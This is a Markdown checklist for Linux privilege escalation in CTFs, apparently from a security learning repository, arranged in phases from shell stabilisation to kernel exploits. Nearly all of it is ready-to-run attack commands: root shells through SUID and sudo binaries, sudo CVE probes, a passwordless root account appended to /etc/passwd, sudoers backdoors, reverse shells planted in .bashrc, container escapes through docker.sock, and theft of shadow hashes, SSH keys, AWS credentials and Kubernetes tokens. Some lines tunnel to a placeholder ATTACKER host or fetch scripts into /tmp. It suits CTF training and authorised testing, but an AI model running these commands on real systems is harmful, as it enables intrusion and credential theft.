# Linux Privilege Escalation - Quick Checklist

> **Maat-Cyber-World** | A practical checklist for privilege escalation in linux based CTFs
> Work phases in order. Phases 2–7 cover 90% of CTF/real-world privesc.

## Document Structure & Quick Nav
- [Phase 0: Stabilize Shell](#phase-0-stabilize-shell)
- [Phase 1: Situational Awareness](#phase-1-situational-awareness)
- [Phase 2: SUID / SGID Binaries](#phase-2-suid--sgid-binaries)
- [Phase 3: Sudo Misconfigurations](#phase-3-sudo-misconfigurations)
- [Phase 4: Cron Jobs](#phase-4-cron-jobs)
- [Phase 5: PATH Hijacking](#phase-5-path-hijacking)
- [Phase 6: Writable Files & Directories](#phase-6-writable-files--directories)
- [Phase 7: Linux Capabilities](#phase-7-linux-capabilities)
- [Phase 8: Kernel Exploits (LAST RESORT)](#phase-8-kernel-exploits-last-resort)
- [Phase 9: Docker / Container Escape](#phase-9-docker--container-escape)
- [Phase 10: NFS Shares](#phase-10-nfs-shares)
- [Phase 11: Sensitive Files & Credentials](#phase-11-sensitive-files--credentials)
- [Phase 12: Network & Pivoting](#phase-12-network--pivoting)
- [Phase 13: Wildcard & Symlink Attacks](#phase-13-wildcard--symlink-attacks)
- [Phase 14: Automated Tools (verify manually!)](#phase-14-automated-tools-verify-manually)
- [Quick-Reference Command Table](#quick-reference-command-table)

<br/>
<br/>

---

## Phase 0: Stabilize Shell

- [ ] `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- [ ] `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm-256color`
- [ ] `stty rows 40 cols 160`

<br/>
<br/>

---

## Phase 1: Situational Awareness

- [ ] `id && whoami && groups` - note sudo/docker/lxd/disk/adm membership
- [ ] `uname -r && cat /etc/os-release` - kernel + distro for exploit matching
- [ ] `ps aux | grep -v "\[" | awk '{print $11}' | sort -u` - unusual root processes
- [ ] `ss -tlnp` - localhost-only services (3306,6379,8080,9200)
- [ ] `env && echo $PATH` - creds in env, writable PATH dirs
- [ ] `ip addr && arp -a` - internal network / lateral movement targets

<br/>
<br/>

---

## Phase 2: SUID / SGID Binaries

- [ ] `find / -perm -4000 -user root -type f 2>/dev/null`
- [ ] `find / -perm -2000 -type f 2>/dev/null`
- [ ] Cross-reference every hit against **GTFOBins**
- [ ] Custom binary? → `strings`, `ldd`, `strace` - look for relative `system()` calls
- [ ] Try: `find . -exec /bin/sh -p \; -quit`
- [ ] Try: `vim -c ':!/bin/sh'` / `bash -p` / `python3 -c 'import os;os.execl("/bin/sh","sh","-p")'`
- [ ] Try: `less /etc/profile` → `!/bin/sh`
- [ ] Try: `awk 'BEGIN {system("/bin/sh")}'`
- [ ] Try: `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- [ ] Try: `env /bin/sh -p` / `nice /bin/sh -p` / `timeout 7d /bin/sh -p`
- [ ] Try: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

<br/>
<br/>

---

## Phase 3: Sudo Misconfigurations

- [ ] `sudo -l` and `sudo -l -l`
- [ ] Check GTFOBins for every listed binary
- [ ] `sudo vim -c ':!/bin/sh'` / `sudo find . -exec /bin/sh \; -quit`
- [ ] `sudo -l | grep -i env` - env_reset disabled? LD_PRELOAD/LD_LIBRARY_PATH in env_keep?
- [ ] LD_PRELOAD abuse: compile evil `.so` → `sudo LD_PRELOAD=/tmp/evil.so <binary>`
- [ ] CVE-2019-14287: `sudo -u#-1 /bin/bash` (sudo < 1.8.28, ALL in sudoers)
- [ ] CVE-2021-3156 (Baron Samedit): `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` - segfault = vuln

<br/>
<br/>

---

## Phase 4: Cron Jobs

- [ ] `cat /etc/crontab && cat /etc/cron.d/* && crontab -l`
- [ ] `ls -la /etc/cron.{daily,hourly,weekly,monthly}/`
- [ ] Writable script run by root cron? → replace with revshell / `chmod +s /bin/bash`
- [ ] Relative command in cron? → PATH hijack (Phase 5)
- [ ] Wildcard in tar/rsync command? → Phase 13
- [ ] `./pspy64 -pf -i 1000` - monitor real-time process spawns

<br/>
<br/>

---

## Phase 5: PATH Hijacking

- [ ] `echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done`
- [ ] SUID binary calls relative command? → `echo '#!/bin/bash\n/bin/bash -p' > /tmp/<cmd> && chmod +x /tmp/<cmd>`
- [ ] `export PATH=/tmp:$PATH` → run SUID binary
- [ ] `ls -la /etc/profile /etc/environment /etc/bash.bashrc /etc/profile.d/` - writable?

<br/>
<br/>

---

## Phase 6: Writable Files & Directories

- [ ] `find / -xdev -type f -writable 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"`
- [ ] `find / -xdev -type d -writable 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"`
- [ ] `/etc/passwd` writable? → `echo "root2::0:0::/root:/bin/bash" >> /etc/passwd && su root2`
- [ ] `/etc/shadow` writable? → replace root hash with known `openssl passwd -6` hash
- [ ] `/etc/sudoers` writable? → add `username ALL=(ALL) NOPASSWD:ALL`
- [ ] `/root/.ssh/authorized_keys` writable? → add your pubkey
- [ ] `/home/*/.bashrc` writable? → inject reverse shell
- [ ] `find /etc/systemd/system/ /usr/lib/systemd/system/ -writable 2>/dev/null` → evil `.service`
- [ ] `/var/www/html/` writable + web server as root? → webshell

<br/>
<br/>

---

## Phase 7: Linux Capabilities

- [ ] `getcap -r / 2>/dev/null`
- [ ] `cap_setuid+ep` → `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`
- [ ] `cap_dac_read_search+ep` → `tar xf /etc/shadow -O`
- [ ] `cap_dac_override+ep` → overwrite `/etc/shadow`
- [ ] `cap_sys_admin+ep` → mount /proc, container escape
- [ ] `cap_sys_module+ep` → load kernel module (root equivalent)

<br/>
<br/>

---

## Phase 8: Kernel Exploits (LAST RESORT)

- [ ] `uname -r` → `searchsploit linux kernel $(uname -r)`
- [ ] `./linux-exploit-suggester.sh`
- [ ] CVE-2021-4034 (PwnKit): `ls /usr/bin/pkexec` → exploit via GCONV_PATH
- [ ] CVE-2022-0847 (Dirty Pipe): kernel 5.8–5.16.11
- [ ] CVE-2024-1086 (nf_tables UAF): kernel 5.14–6.8
- [ ] CVE-2016-5195 (Dirty COW): kernel 2.6.22–4.8.3

<br/>
<br/>

---

## Phase 9: Docker / Container Escape

- [ ] `cat /proc/1/cgroup | grep docker` / `ls /.dockerenv` - am I in a container?
- [ ] `ls -la /var/run/docker.sock` → `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh`
- [ ] `id | grep docker` → `docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash`
- [ ] `cat /proc/self/status | grep Cap` → CapEff `0000003fffffffff` = privileged → cgroup escape
- [ ] `id | grep lxd` → lxd alpine image escape

<br/>
<br/>

---

## Phase 10: NFS Shares

- [ ] `cat /etc/exports && showmount -e localhost`
- [ ] `no_root_squash`? → mount as root, `cp /bin/bash . && chmod +s bash` → `./bash -p`

<br/>
<br/>

---

## Phase 11: Sensitive Files & Credentials

- [ ] `cat /etc/shadow` / `cat /etc/passwd`
- [ ] `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null`
- [ ] `cat /root/.bash_history /home/*/.bash_history 2>/dev/null`
- [ ] `grep -r "password\|passwd" /etc/ 2>/dev/null`
- [ ] `cat /root/.aws/credentials 2>/dev/null` / `env | grep -iE "AWS|TOKEN|SECRET|KEY"`
- [ ] `cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null`
- [ ] Found a password? → `su root` / `sudo -l` / `ssh root@localhost`

<br/>
<br/>

---

## Phase 12: Network & Pivoting

- [ ] `ss -tlnp | grep 127.0.0.1` - hidden localhost services
- [ ] SSH tunnel: `ssh -L 3306:localhost:3306 user@target`
- [ ] Chisel: `./chisel client ATTACKER:8000 R:3306:127.0.0.1:3306`
- [ ] SNMP: `snmpwalk -v 2c -c public localhost`

<br/>
<br/>

---

## Phase 13: Wildcard & Symlink Attacks

- [ ] Tar wildcard in cron? → `touch -- "--checkpoint=1"` + `touch -- "--checkpoint-action=exec=sh shell.sh"`
- [ ] Root script reads file you control? → `ln -sf /etc/shadow /tmp/innocent_file`

<br/>
<br/>

---

## Phase 14: Automated Tools (verify manually!)

- [ ] `./linpeas.sh -a | tee /tmp/linpeas.txt`
- [ ] `./LinEnum.sh -t`
- [ ] `./lse.sh -l 2`
- [ ] `./pspy64 -pf -i 1000`
- [ ] Transfer: `python3 -m http.server 8000` → `wget http://IP:8000/linpeas.sh -O /tmp/l.sh`

<br/>
<br/>

---

## Quick-Reference Command Table

| Check | Command |
|-------|---------|
| Identity | `id && whoami && groups` |
| Kernel | `uname -r` |
| OS | `cat /etc/os-release` |
| SUID | `find / -perm -4000 -type f 2>/dev/null` |
| SGID | `find / -perm -2000 -type f 2>/dev/null` |
| Sudo | `sudo -l` |
| Cron | `cat /etc/crontab && crontab -l` |
| PATH writable | `echo $PATH \| tr ':' '\n' \| xargs -I{} test -w {} \&\& echo {}` |
| World-writable | `find / -xdev -type f -perm -0002 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Docker sock | `ls -la /var/run/docker.sock` |
| NFS | `cat /etc/exports` |
| Ports | `ss -tlnp` |
| SSH keys | `find / -name "id_*" 2>/dev/null` |
| History | `cat /root/.bash_history /home/*/.bash_history 2>/dev/null` |
| Container? | `cat /proc/1/cgroup \| grep docker` |
| Procs | `./pspy64 -pf -i 1000` |

<br/>

---

*Priority: SUID → Sudo → Cron → PATH/Writable → Caps → Docker/NFS → Kernel (last).*
*- Maat | [Maat-Cyber-World](https://github.com/Maat-Cyber/Maat-Cyber-World)*
